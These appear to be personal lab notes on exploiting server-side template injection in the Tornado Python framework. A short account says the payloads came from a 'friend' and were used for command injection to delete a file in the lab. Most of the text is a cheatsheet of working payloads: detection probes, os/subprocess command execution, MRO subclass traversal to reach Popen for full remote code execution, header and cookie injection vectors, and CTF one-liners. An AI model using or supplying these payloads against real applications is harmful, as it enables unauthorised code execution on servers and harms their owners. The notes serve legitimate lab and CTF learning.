https://www.tornadoweb.org/en/stable/template.html

Tried some hacktricks, this didn't work
https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#tornado-python
https://ajinabraham.com/blog/server-side-template-injection-in-tornado

so I asked my ol friend
and got some payloads

At first I didn't see it reflected but upon inspection it was reflected on the comments tab on this lab so I did cmd injection and removed the file

---
## Tornado Template SSTI Cheatsheet

###  SSTI Detection Payloads

```html
{{ 7*7 }}                       → Outputs: 49
{{ handler }}                  → Shows the request handler object
{{ handler.request }}          → Access request object
{{ handler.request.headers }}  → Access headers (e.g., User-Agent, Referer)
```

---

###  Command Execution (if unrestricted)

```html
{{ __import__('os').system('id') }}
{{ __import__('os').popen('ls /').read() }}
{{ __import__('subprocess').check_output('whoami', shell=True) }}
```

---

###  MRO and Subclass Traversal -  dunno what this is 

```html
{{ ''.__class__.__mro__ }}  → (<class 'str'>, <class 'object'>)
{{ ''.__class__.__mro__[1].__subclasses__() }}  → List all subclasses

# Example: get subprocess.Popen
{{ ''.__class__.__mro__[1].__subclasses__()[<index>] }}
```

###  Full RCE via `Popen`

```html
{{ ''.__class__.__mro__[1].__subclasses__()[<index>]('id', shell=True, stdout=-1).communicate() }}
```

 Replace `<index>` with actual one for `subprocess.Popen`.

---

###  Useful Context Objects

```html
{{ handler }}                 → Core handler object
{{ handler.request }}         → Request metadata
{{ handler.request.arguments }} → POST/GET data
{{ handler.request.headers }} → Custom headers
{{ handler.application }}     → Web app internals
```

---

###  Bypass & Enumeration Tricks

```html
{{ request.headers['User-Agent'] }}
{{ request.arguments['search'][0] }}    # if search is parameter
```

Try injecting in headers:

```http
User-Agent: {{7*7}}
Referer: {{handler.request}}
Cookie: session={{__import__('os').popen('id').read()}}
```

---
**Engine:** Tornado (`tornado.template`)  
**Impact:** Allows attacker-controlled template expressions to be evaluated on the server.

**Vectors:**

- Query params (`?q=`)
- Headers (`User-Agent`, `Referer`)
- POST fields (`username=`)
- Cookies
---

##  One-Liner Payloads (Ready for CTFs)

```html
{{ __import__('os').popen('id').read() }}
{{ ''.__class__.__mro__[1].__subclasses__()[396]('ls', shell=True, stdout=-1).communicate() }}
{{ handler.request.headers }}
```

---
